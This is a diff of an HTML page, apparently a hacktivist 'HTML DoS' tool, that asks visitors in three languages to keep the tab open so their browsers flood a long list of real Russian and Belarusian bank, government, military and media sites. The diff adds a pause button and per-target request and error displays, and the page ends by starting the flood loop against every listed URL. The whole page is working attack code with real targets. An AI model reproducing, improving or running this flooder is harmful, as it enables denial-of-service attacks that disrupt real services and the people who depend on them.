@@ -1,100 +1,135 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
     <title>Russia and Belarus HTML DoS</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <p>Reformated from https://stop-russian-desinformation.near.page</p>
-    <h1 class="title">Russia and Belarus HTML DoS</h1>
-    <ul>
-        <li>
-            <h3>English version</h3>
-            <p class="sub">For security concerns, you are able to simply save the webpage, and run locally - as well as
-                view the
-                source. It
-                is
-                entirely HTML and browser interpreted.</p>
-            <p class="sub">The "official" news in russian federation and belarus are all fake and we believe it is better to shut
-                them down! The government sites and banks are also taking a hit!</p>
-            <p class="sub">Please, just open this page and let it be open on your devices, it will flood the web-sites
-                and pose a
-                huge load
-                on
-                their infrastructure</p>
-        </li>
-        <li>
-            <h3 class="sub">Русская версия</h3>
-            <p class="sub">"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
-            <p class="sub">Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
-                будет
-                автоматически
-                нагружать сайты российской пропаганды.</p>
-        </li>
-        <li>
-            <h3 class="sub">Українська версія</h3>
-            <p class="sub">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
-            <p class="sub">Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
-                навантажувала
-                сайти
-                російської пропаганди.</p>
-        </li>
 
-    </ul>
-    
-    <h3 class="desc">Here is the stats of your session (the links and the number of the requests that were sent from
-        your
-        browser):<br>
-        Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
-        packets - which is the goal!</h3>
-    <div id="stats" class="stats">
-    </div>
-    <div id="errors"></div>
-<style>
-    body {
-    padding: 0;
-    margin: 0;
-    background: white;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(to bottom, #005BBB 50%, #FFD500 50%);
-    background-repeat: no-repeat;
-    background-attachment: fixed;
-}
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
 
-.title{
-    margin: 0 auto 3rem auto;
-    text-align: center;
-}
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+        crossorigin="anonymous"></script>
 
-ul{
-    width: 100%;
-    padding-left: 0;
-    text-align: center;
-}
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
 
-li{
-    display: inline-block;
-    list-style-type: none;
-    width: 20%;
-    text-align: center;
-}
-li:nth-child(even){
-    padding-left: 5%;
-    padding-right: 5%;
-}
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
 
-.desc{
-    padding-top: 2rem;
-    padding-bottom: 2rem;
-    color:black;
-    margin: 0 auto;
-    text-align: center;
-    width: 60%;
-}
+        .intro .howto {
+            background-color: #005BBC;
+        }
+
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+            color: #005BBC;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+
+        table.status {
+            margin-bottom: 10px;
+        }
     </style>
+</head>
+
+<body>
+    <h1 class="title">Russia and Belarus HTML DoS</h1>
+    <div class="intro container">
+        <div class="row">
+            <div class="howto col-lg-4 col-sm-12">
+                <h3>English version</h3>
+                <p>For security concerns, you are able to simply save the webpage, and run locally - as well as
+                    view the
+                    source. It
+                    is
+                    entirely HTML and browser interpreted.</p>
+                <p>The "official" news in russian federation and belarus are all fake and we believe it is
+                    better to shut
+                    them down! The government sites and banks are also taking a hit!</p>
+                <p>Please, just open this page and let it be open on your devices, it will flood the web-sites
+                    and pose a
+                    huge load
+                    on
+                    their infrastructure</p>
+            </div>
+            <div class="howto col-lg-4 col-sm-12">
+                <h3>Русская версия</h3>
+                <p>"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+                <p>Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
+                    будет
+                    автоматически
+                    нагружать сайты российской пропаганды.</p>
+            </div>
+            <div class="howto col-lg-4 col-sm-12">
+                <h3>Українська версія</h3>
+                <p>Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+                <p>Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
+                    навантажувала
+                    сайти
+                    російської пропаганди.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="desc text-center">
+    <h3>Session Status</h3>
+    <p>The number of GET requests and error responses for each targeted website is shown below. Failure to fetch is normal! That means their servers are overloaded and dropping
+        packets - which is the goal!</p>
+    <button type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
+    </div>
+
+    <div id="stats" class="container">
+        <div class="row">
+        </div>
+    </div>
+
+    <p class="footer">Reformated from https://stop-russian-desinformation.near.page</p>
+
     <script>
+        // target list
         var targets = {
             'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.avangard.ru/rus/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -315,7 +350,7 @@ li:nth-child(even){
             'https://www.astralnalog.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.nwudc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.center-inform.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https:/kk.bank/UdTs': { number_of_requests: 0, number_of_errored_responses: 0 },
+            'https://kk.bank/UdTs': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://structure.mil.ru/structure/uc/info.htm': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.ucpir.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://dreamkas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -347,17 +382,28 @@ li:nth-child(even){
             'https://epnow.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://ca.kamgov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://mascom-it.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-            'https://cfmc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-       }
-
-        var statsEl = document.getElementById('stats');
-        function printStats() {
-            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
+            'https://cfmc.ru': { number_of_requests: 0, number_of_errored_responses: 0 }
         }
-        setInterval(printStats, 100);
 
-        var CONCURRENCY_LIMIT = 1000
-        var queue = []
+        // initialize variables
+        var urls = Object.keys(targets);
+        var statRow = document.querySelector("#stats > .row");
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = true;
+
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerHTML = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerHTML = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(urls[i], i);
+                }
+            }
+        }
 
         async function fetchWithTimeout(resource, options) {
             const controller = new AbortController();
@@ -374,8 +420,8 @@ li:nth-child(even){
             });
         }
 
-        async function flood(target) {
-            while (true) {
+        async function flood(target, n) {
+            while (attack) {
                 if (queue.length > CONCURRENCY_LIMIT) {
                     await queue.shift()
                 }
@@ -395,14 +441,39 @@ li:nth-child(even){
                             }
                             targets[target].number_of_requests++;
                         })
-
-
+                        .finally(function() {
+                            updateTargetDisplay(n);
+                        })
                 )
             }
         }
 
-        //Start
-        Object.keys(targets).map(flood)
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var target = targets[url];
+            var cell = document.querySelector("#target" + n.toString());
+            var display = "<h4>" + url + "</h4>";
+            display += "<table class='status'>"
+            display += "<tr><td>requests:</td><td>" + target["number_of_requests"] + "</td></tr>";
+            display += "</tr><td>errors:</td><td>" + target["number_of_errored_responses"] + "</td></tr>";
+            display += "</table>";
+            cell.innerHTML = display;
+        }
+
+        // Create div for each target
+       for (var i=0; i<urls.length; i++) {
+            var newHTML = '<div class="col-lg-3 col-md-4 col-sm-6" id="target' + i.toString() + '"></div>';
+            var newDiv = statRow.innerHTML += newHTML;
+            updateTargetDisplay(i);
+        }
+
+        // Start DOS attack
+        for (var i=0; i<urls.length; i++) {
+            flood(urls[i], i);
+        }
+
     </script>
 </body>
+
 </html>
